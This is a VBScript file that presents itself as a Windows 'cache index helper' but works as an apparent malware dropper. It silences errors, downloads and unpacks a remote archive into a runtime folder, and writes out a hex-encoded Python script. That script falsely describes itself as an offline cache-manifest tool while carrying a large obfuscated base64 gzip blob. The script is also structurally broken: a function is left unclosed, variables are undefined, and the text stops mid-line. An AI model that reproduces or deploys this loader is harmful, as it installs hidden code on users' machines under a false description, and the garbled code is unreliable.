' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex first, then repo
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
If Not fo.FileExists(P1) Then
    Dim e
    e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d206227346b5370633055583662754a5839782b4c4e686241724d494c6d3479682f546c454a3834365762672f6232783645772b4376564647442f4378356a577053744e53556879793157377466524745495836555348516c636331313034594d644a4c45383637427647333755484e6e31344b536c47306f625252377233442b306774567668626a544935706b68534c55536c356f384f594c3751465572644e4d59492f4144646230674a31706b4f41326b634d2b6f3377786b6d6b634649475336" & _
        "676562563846567238666241416f596e4d494c3048314d524d536f6874574f35694d3766755774674f306d4f36484f4b464d736e5368704f4344706f443753355a3544564d463949374664323836637476346338496138353055732b4c695871484e384e6c6d51744863646c52332b442b7043684376314b536a6a733033617253463066336464626f554f325175507661614a346675704b496e6b65356b4b584f483854554d44694b464b6a2b344e687061637234763357304e5a42754747504759384761723250723553542b4a69316f356b433158714957556735387637585559596e71472b33664f5758497654683850774759514a35786a71637677352f5168727331656e727471714d556f754a517a793738486a38525667636f75444539382f3856534e7335376f476b614764736e356f736c70487348426e2b534a57586b4373714a6473745232692b51763772413564787931694b532b72652f7a6b7a4c4e4743484b36675565313738416d65304762465234347152476c7833755851636a38565250737454544b43716d5074652b697342644630595679463132466a33424f4b2b70377237734b757a77352b44412f2f554847786470774d6862754457" & _
        "634c6d6b315265713657664b75734f7a6a326e45573676774f523558594d3747483351786c45794a576f647a536e365378666530646f6f6d4735585235306d4d4143547347504b7170335a43314e2b49733567615a575a316c373539726e554a545553785958714c495a7151494b68556533676554526a2b4c63416437537148424a5363763945744f6b5571444b5a5a732f6a4837764a55594546764c6b504f5937596f68646c4746776c364f666e4d4e637159533756554f5242355754446a69674953352f2b657872306d5357336b636364476459674f792f5872754e50675a3258362b64453055754d516748626a77483071446b4c7955317231374237565072644d2b3844746b484750515036467849446f34694844664a5066784133555a68704a2b65464c5459382f776c687159396638316c505273597a506b6a426b6534684b304d6c6f647a6f4c4c565a5942752f524661396a4b704378365649496830552f37534449386d4b614a4772386241726a54632b7268456a4e77576364783272346b596a3731476c2f347042726e4d4e53382b4c61445a484778477a70704c4b3863764d716c35726a36565a55587a4a6e70533943434d4b396e42624d582f" & _
        "502f61326b6141494e4f6a6a7178575546362f58504f54764939756e2f6a65494873344d336b4f552f6e4832333554797477756a70766c47683031494f794e4a7834313250384e55425952776e444e79664759632b3930716f77784861636a637252376469307275306e4e56784d4e4872773131642f454b5075794b69462b4f344255387765784b75745154416345314c7135734238416845436e367a6f5659356c3168362f4646316a786635542f336856356f696b474d3643397942656332677946574b584e6c55362f48324132477a6e4e32366544335759616d56584e42595631487a4e376937533664416c38437161527837394954572f617961645073635157733147502b46473043743949484d364a374e5641616e5072646f44513256414a563047664b495473717570384a45703135584e664563367961377051746d533433652f4e65637a4a464f667354717a6376684731724c65774c2f374172394b4739322b583235496f504c4e4958565750695562494536722b6b5a376a6d6a655632754c5577317a5045474e4b6b352f6533324a4741443066683453442f4d5663636a66556761766751565635584a7a49556a43364578427479747264354873" & _
        "524446346f584f384c4d394e59723248696b50526657682b6e6f453754484b517063546732316474426a7a4d5676783468746c617a4343677575596145654b6c7862794f773454587a78474b444e344c6c3037386239393431306167486b39453575612f767966416b7a4331484d6647722b334f44726453744471766675784e66774838413952796156456865517445382f444b58393047506e4c562f53664a646c695343543869337a786c79506654416e4b6f69675a6344574e30346d4d6631584d3253515055624c3267594c72587079414c774855412b2f357762726e45465a7069787278415548547378336139755171745649536570697862357443787331696853325659526e4130654d35722b4f66345a586274675a544975564346635057316f4f6d464d4a796f754a6e486a4b47474d784d36696168576e526c4a4b303866634a435a7877385872436c64777338335a536532707765386953504d483351746e466a686d62734867715342644e535a7177377346396336704b6f554f556f65525451714d7a417668356f58505a49765769556766624f3435454b316c3638704644496c74562f62736d557757634e5366654a53776c34722f474d434468" & _
        "35766e482b314d352f533549574a5966526a6b745876524b6f69313457616b753934507a6951673035386d4b492b42625046425472614b71344b6857597a4c684e4f464261795079494f7a4b736b2f50775832624c45543439644e382f657a6830476a72696c46613854764c456e62515137393736323663654b796d6b78586a675077556d424d755135794e6839444c6d2f5565632b535267696e684d705a39304a43304b6e4b78465842356e344d4e4472584f7a39484353516d50496a337143412b41616a436f52646752705447696368512f7843425642744a4a7379554c4962496e7742627a485170414f75724d70397679683351454e4b636375546f2f435a35344749757177703751705049625a615a5649526b47714a38744c7a736370796962707770636b6a345353384a42535a374659306d50386f6c57456c533764786b662b5a537a71396b4f6d48355042422b61337a696d785752516956302f515834376a644e755168416e756c705a6544434e2f70635a52444d457570677241464e714b2b53336d71496d574a63637355363237506a685863665546626f744e33756a764554636669336947674e6e414b682f664b425162516f7361514f4c702f" & _
        "6f755370746130376f6f344f714c57695533344b7869435273494645726f6f6946536d55654459436e3630724737317a6e494a67593446726f46714e6a6e6f6134584e424f684e37762b75556b464b562b6234713251442b51497865366b4a4e33337a3769596373416d59594b664e487857534d4349506c684a767a797650436d446d42496f33476b47522f43714164363036325a6146512b4b3866786771374b47512b5144575973505251483749306a54534b47636a72314e434c48395536797351424155597a337872454c437743797866665a6576386e312f5368432b4d374b2b7251347350397053484a6145346b6d2b712b474a4d68474d3272317746375844614470376f732f3139375559364948576e7378557847446c6a4b3852346b4e5774596b454276497a4851396b564c7475334f6938584c5432563972327a4d356d73346a54525a506e54636557644756526178426b333269596e4377345769516f632b4f73597a344139635a4e68685a5a705862694175593847574a3379785a395a48562b575a2b7038696d6b76437738756e4d55794f6357547457623961396f3746744f426d7156666a70456b7673456b4a4d6d70476d7856344d6e514f50" & _
        "635246497366335263786a636e56707130626b566b4d685175676d364e5474787637763471653164544a2b4b6c58766c464e685943665433794646524a34505958526539756465326b4377346c6e4f64483644524a2f774d346a687a4d4b6356455965494d6b6e4a38336d5058312f443779523741672f6743697257466f6d4d63736e4a5275496731766e4b5a66346347375144424441596c2b4a447062772f6950676971576868344b775577387277346873674b686b356952637165656a44722b337978306b716f4238524c7632712b426e475a51755543326f4b6b4d42427738514f4f2f6249737839766d7a48744946314b337a61427341707861373559734333415255436e4f657a796c4a412b7171534941544d54342f6e4f56565448794a58376b707938634f30474f697537546a424d783350504a4155684234506643374259386371432b446b535275467a514f4576567752426f662b3346457231774b426b6650635075644a73454d6a3030575137614373545a3245534948713859584f3056707a502f5079762f33563534413864303246492f47694930415a3341566e4461474163644d6842424a34486750546b53784b643657794b31577a733145" & _
        "444830536539416f57706230533545624c564857725566655835617143434e614d417462424c646b552f59314634504a594c34496b323778746b6d7a64593639384f4933504e412f72354f377348504b5535736871575a386f6e356954317133763858752f62786a3173674c5345312f715930355346795771426a6e786c337230663944666e4e365a6d6f2b773549594851732b6b5837556e75495446564846745863707944654c44644c78536268667665717a4c4a32384c684f5831565a4555584b4e72483672306c4450646f63724a67392b336764394878516d46616c4e442f736c4c5155766f3674595970664a71536f6b4e3666613637372b3359476f577a752f707a4558497a69475a4b702f76644c4871414d37557371744a637971694b596a6d684156626b55507a6c52524150527658776f79614c4e44363661706d4d327a2b37636d57692b4d50443749417046623575766f614b4176356d534f54657554557446545a50324b373643416c6239442b2f49524e5a454f547964596c5a6c4a36787a3945757350787563682b636752536a6d387675514a6378506a5671357879684474436c67616d4a6f48716e32346567633745377155767077307545" & _
        "73546c59674d78625a52794b64564555775937304e36796c777745575730667039503544427050756b3969484b63565663776a4339316a55304a356933386e4d774d364e32624e7a306b705a4b7644506545304a54466f684a7054684a394173766a54375369724867787236457947726b4d5668623842464b563657716537305777546e424645436d7278665a4f35567a617464635453546f566e4b726e4441763153726d4f474b79302b51714d5938526b696f55735235664d42713072375a656a2b7947766b745953683247366b4547452b4a6734494f617a3654512f2f3935416363666f415a4548665045482f41347a2b4a752f535a454e755169454673696366616d51394e796336724f615870386c6c466c79476c5048465432534d414e5266514c497767766c756e5a48354845474b4131724c726c6d507832643730347561773245664949434d69592f4a7a6a595278705a777a5353792f46752f7736486d482b4f66466d2f50486a615545794b4a5052694c536f416e647364385959464668324d6a494c51727067522f3479352f65754b2b784e7030576f787a367332306c556f506a7742324c724c447a77566948757875734f313859364a41463565" & _
        "2b50755a53714547345449753664576a6747454a73396b664e3962714a5655496b6a32484c7149522f6735665538685174442b5274354e7267575778446c66442f7378484362415a6b67516e466c324b3871614e35717a6a39654b5678796448736543774349515667724f486967485371395639316e4452634a59352b42615a6645443451475a423979457933764f4661716259357931464e50676753762b784a5a4b6f624f354a78706953584f454a2f376f394435626f4d514e4975774955763645423872674769534b6d6f49476e764e7352414e79564f48754d786e4644744a7969453050495644497643632b545346736d436972674849714a432b302f3162492b3069444e435275477254356c2f43755856766537727a712f4e4d6d4f3035412f543463546c664a6532487741425571714a41523141613770414c466c6a764431315a6837672f6d3559553476546847615769553070423738444e38502f41797759345538386c7539454d4d4d47516974417571384f496d674b61324947487a2f7567384369424b5548492b704263647a44506d313563792b6733346572786e2f5047692f363055482b3161302f58764a314f74413430533953573057305a" & _
        "32645a72425268333551684b7577375a6d3771377541315a58444f4a6f6b4f356536784f4143422f514f5162634c7549316458426b652b717745797153547a684474765a612f5453614b665365494f336e2b656d7a392b417766416f566d6a415244497162376c466c6d4c6a5769526876645876424e44657571506f53464c72726b4d686573734e51616178476e4759786c6b5154426249436d75355454516835686e48425450726a434f4e30452f48547a556a6e706a374d526533336f75424f6e496831576f59726c6e2f617463765a656542673972676138357247646c4254686a584c52397a6338525a6a34644d36626c7262315157326f46683963312b61576747692b7049366e4253616a726b38306e615a7070325457474a6f555131554e774976716a77444f68716c54757a7957446178546d6c344d4e52783434676c31634b59524c3056634b79375475364f6c713666315a355449653038786e69364573512f48664375556d4b374a664e724365774b55344d4b54644c3561744844344563596c716e324248385973704b53376b3359617a577a4f4e612b644734346866694343414c34643561434545774b476a79673953374b436d37394531445466" & _
        "305a77476c347a6a6e30494563652f6c2f72494b5879594d6b4e4a4b6f2b574b53494b546a374472693647742f6957564c3338586b613678494c4f726f796f7439526b326e474e6d4c2b466e394571764d743462496c4447367067336d65695846696346316a2f542b654b645752637945776862614e4b7168716145705057792b3567525532306978325677786e596b704638436746714274444845326b646149794f6a307932754a6f42384859343738785436536a417a4337626a496c6a78327265584633677845306a5934444a7a4b4a4356507245532f6c3133714c76616a57527774784a7855374866734a6f4962784670734c674343776b69485167364f6e572f6b374d777638564442786d2f6849315839464c6651464d43327a70795830397962434c4b4e356e6e6d61396c387a58765748522f3279636a6b4e4532374d43626d35667448533732795a4f35454639687a66474e6667362f7044627652704d3635373576687364587a4d4654727051593754537737656e674237792f3249547558665548587855703562746738387769424c413939793571465447586666306a5041675951757a57394e3868396a394a566a4555416b4368742f33426150" & _
        "3665384166497554326a4647647a454b6d394f384a4e377a5730354c6d65374166685749413965535136682b51612f4c51677952657473447176736274714b486648546f61487239625452784f39636b762b766d53666869565768486754472b4942577143376b37357a504739635a51382f774666526879485245566a39645a6544324d476263366d417a626a4c6d7667536f4278754b6f443248452b424159436f30726b7534776846663473304c6738474f66623172353670486c77394864533369694774422f57466d696531504d30494255694e7533422b66516368624b6c31764e77467735485a6c4348584e6c41705639577442487374426b586f596263666c412f4164394c5547726642654461595169577953673442324939772f5a36364d485242364d494536483533774a77556d514f5a3958384d486a6b763061757266646a773767724a705a5063337947353667666b4a32593233726f7a54346c63647a6a47554c5731554e2f71687742304731333846446366626b743456693943712b662b5975556b43736637545641375843434741376e6b74577a6a76754575516c53492f4c306739566d6e7842736a717a324f425934376e416562416f7836" & _
        "4b4650354c4a483274456b7a4d344b4e5567424a626e6d536d7679664b4b6f2b7a6e4c327a7067524562552b707754766d64512b63374a713739744c6b346b314d4776754f344f744e716b3645566b6f78456d356c674937727768526a365a5649522f38624635516d3747464c6252484e376f2f6e71326c6e66344a336741532f4e51427a2f686d6b742f6c6134544e677469617959555968743665633441624476332b56796c686e696562552f6945794c6771583549615143797848686a742f4158516734343561645a5771666d46526f69475453424b4c5a41714c6d54424a43424d374373412f4b47514f4b426b6c6953392f76785a344a6256437a55546d3444694d6a6c6f51486e5056635a74535545776c715830766f795050616b66614265774b744d2f4a723434526772734f55674933374c6a6a626c65495435513943724d695643437534733457577877324966744166763935516f43792f32532f6e6d4c4246677339697953386849307037376659662f42416b706d6835362b5a5a524c77396a5535304c5365313869666543574f3043354f37455a56516f425578395449767857456c4d6e73616c685a7a6a55612b392b436679505175325a7264" & _
        "6238564e696c633776654c4d36676c484138414379396178735a4371353738763155336b4d2b75375355614b613244494b356430384e376a4761687037532f6357722f756d384e7362516f53456170783330337479794569786257504c51745845644a6648314c53682f2b6c624d6e543174395242516b454f4c6b50344c3269564b3757314c54614268516644684a5033584952546c586f576532452f4774714f4f314930356a6538356d61334d456354374371542f73454969524d414c7451627456784c3849655a3259544b483875507670566b45304d7074632f636b386e5558716a44627639646e5747563554385a7153686b66517449646f377a326978587465303148393842534174564f59664776534e2f42654a424d46516b3358483031384974686e74382b6b64456458694f6a6c334f726973636d5345556f367a777a3161646c74464134337a46636576307a576e6842716e35546b4632515958576850314847674d4f4a4f315451594e7364425a78692f2b79626d51694b5a444836424179354e65695156444b394336434e704d5a774a44675571506b414b384c79656c493663536a567943445548684d374f58313049494c6d62456d7261503466" & _
        "6e3970332b6c6a6730336d5731682f453046366233612f38793270466669316744794335756451454e4b6a4235354d733833706c6b39762b47512b2f6154556f2f4631485730553542383278576b4f68756a54753265416865583067543555364a4269544c4c4a617458536244584565494c373965314c79544735566f4f696d4842384b4e766f554b54326d426b7432333350593774376c6a5763486750784b7a653937465a4f5876664e765a496276634f726454512f2b7956507948456e79547652695561543561566b4a6e4a396a3641574e6d62386f386f38474d4c50462f4f755957356a556469513971793866306e506a4f3052566f69666f754a6e4a43456374464442444a487277506d41694a4e6268626d4e572b35447879596878766866752f4d39635348535146652b57357767766a5177617a58484a51495342366a39376f3033715a31376258793170304c5676524f705354544855445047683148687853637275535077376672306a644645684f2b497a6f656e4750614633335033484f6d61656c4c5451575976304d776b344c6970304f7a2f496d73374b574f74565468416a31327248704d70534769673576566153442f7763636243654769" & _
        "5a586e704443334e566e635a4e716b68594a55767646386249304267396b6278503748724967362b626a704c73387555656673547746767668575a48334549464f707457656268654b63662f2f456d4670747545595072796e58595a55474e735462796242464835536c79464c484c42514b2f48414c65325762307548623234524f5a394a3678656c486a4745726c4d4e71375573324f384e31412f41345955696857715530612f784538666850395143436253636949364877764179386c726866616f67666e38586c6171635276504b5a2b6572313069454131714e58666d79414478704b756a37476e635944312b5a66707152716e70573262554e3471396e366479785a5961414937422f2b3830616b685648324b384741716d386d6548697663587236482f466b76434c553170706a684e344531356c78624650757a692f625633594b584d44665a63554443753772304530655047496665597933757153644c2b376d7776574d624c6b354658626e41624d54794e6c524a714d52634c39354c694831316941756e452f355949663143624e4541676f384f512b53682f442b674d78735079464f64386630544c75483174374f74543043524a76596e716e61" & _
        "316138543679546c6a637a36795557306261484d656877453737627258646e586f5276686b4f544335573861635577722f4b734d5647656e4362686b454e68436852546679637a4755333851704752615674672f64534178786f357a5a4b4c4e503859714e3056626d586c37614861424936747177687a466e667876637a2b3461766a316d536b75494f556e4d42687545376132534f58563257425a31677a70765754397969685249324b4434715044764d49655a2b4c6f31436956577a357a577667355a4475483134655a6750714b3972642f6749717770656b69595166354331785870557961445033506632625a6f6663373635585a324c4662437779336e593468533855325363496c312b524a545573586164794939794d6e6a674447306b577169766e4b636355466d46514676525857356a6d7432554d5944766d5265663044556d7a726351365a2b6b3333633168384e2b685a4e764d464f6f6b4c4e473139594d7565696b4e306233525639397164386e4f6f634f464c316a657948316f76714e3147504a464362714c316958466f6a4b4939444c564c4e784d33784b6d635458672b6933414b6c2f494a363553595a62634c59694f4d674777616c7a" & _
        "39344b61596c783237644a6b52676b39432b694e317331507943306b753648624e6c574850476a6d734c68437836783034385153474361684c54794f4c6247355841792b71344e684c5052522b704a7a50736a7931325143435731662f7652503464355a567964755463394b43455236514e77357265576a356a5330393569516b2b5a31646c476265734d437174307648646f6875354e4a717878334b366f69515a676f3257377173396c417a445634636853395570364673564255486d2b75554666743951717a71775363626a64787652636b636c6b754c70593334725a6e4567495349587a2b4c68485068715846695068514b5068544c7a5a5858447274424b4337364b515734796e776c5a3667596a7879616253544461576e516e656e7265623356424d754d6330505a696632304c6e7a35564537395a7355544666626f565271726e6f666f366a304c626a6b6c4b386e6a6d4a425162626851626474443755755a4f2f65474337397a3165633164335072706a2f4f5155304479415475587055364f4f2b704d59696970614c66443470764662565468312f3434613859316569627751445736536750345a6b4969677337676357306c314f7a3942347967" & _
        "306c4d5844766b784a437532593434576b3172776d304643486e74594d484c30716346653575747149544a786d374742556457595a56787453517241526634416e693774645338336b514b4b5973637632547248355a46416a7762676377394d357656774e664d79743141386c71666f704d6230645158463257574b6e4855302f4368324948594e6268425476706636776c354b7534314c322f446d33574353656b6f46686b4d566c4c6c5444424e46703937734337756c3572716642484a4264364c6839623442396730467149594f583946763142654d697a50696f31336c69323477336a4d4e6c75654769546b49714c30555a74502b39335a37737446774c486b4832673951484f695846786c5353454b78364f595330674d347a6b67343731526548696f4f55554574736242563076315a745a6457647a2b6570536f46542b6a5977435134562f584433745435545039466958707759652b563073716e354477514b50504149785653444d3454734f30797344354a4b556757544933447761596a366d685968514236556173506c71535a516d2f4f2b6d4e456943524f6d3931374e594b324f3337535742354d7567492f584f5258554f76526e73584b4f6e" & _
        "37734b30706d68344268393479744434674c782f316f555171664d32796e493832304950416d534f4f6665344d474a2f6a2b39775462304775744348334f51796e4e717075486856743545794830724441595a4a79466d3571704e33597a733846675356357461556a383171744f6e4b46554a646a4d7a554d693739412f397a6a64784932595751696f4956776f794b6f30367a6c53566f364f394a6146686a4e54397a704275333664326545434161693445326a696b69384e33706b51624a7477326f4a535244307550464b696f6364367146393458426f7254326c6732394949744f7a526a436a76556c44716c7850647a47566d7848783457562f6d475a362b7569786b3468746f506243327a5071346e6c32536f71672f2f45495650615077395248394f73464277706a6379544431784138735376744630645535424c5766702f50622b312f506e767337342b4c614f4455414f394e4738444168764c76633134654a4b64374131556e76596c66786759385a714374715845336e644d345243717673515244424e546c30627937635a414b3450505533535875597441645a74306a6d7568326650556b62314d3569686c2f78526374534d4c6371704f4e43" & _
        "7a4e504346426d4d7233486c4b51392b352b745654323266515a41637570684b434954695a5841316b33416e63577069304e5a3856333437667267573347684d67366f6563386a533248466d667479353762426a674274506d4b76764f496a5a32644550675a76663565572f4e6a444d4363387a3668516969734637554c7139336a57624554682f62304b6f52624c716444714a37366a534775314867644e6c374c4668643742717a486970703136326b7976786170464b59506132427476472b736639794b6962624b3375367359335a6c65633464734a3256314c5a6d632f4a2b746c6443426e4c59586b78666b386771497a457862364752644b54666b454d2f563754384b35534b6b2f724e7645513773532f7930704958766e534c3132412b30512b635a43497731526d594b764171506e66315a525453584b69664f375876415438475132704e637774694b746a656d454a574644654d3531305a30735a553137566d736a556b7a62777667486e446c39716d49662b796238496b776847533170644e6d5a4268324b7171796b493956754e736f424c6c51544e4f455658746847686c6d63594e61626a42334770476a5a2b452b4359616e6741706669574a" & _
